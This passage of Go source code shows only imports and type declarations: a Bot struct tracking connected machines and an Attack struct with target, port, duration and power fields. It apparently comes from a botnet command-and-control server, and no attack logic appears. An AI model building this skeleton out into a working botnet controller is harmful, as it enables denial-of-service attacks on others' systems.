            "os"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "sync"
            "time"
        )

        type Bot struct {
            Conn    net.Conn
            IP      string
            OS      string
            Arch    string
            Version string
        }

        type Attack struct {
            Type     string
            Target   string
            Port     string
            Duration string
            Power    int
        }

        var (
            bots      []Bot
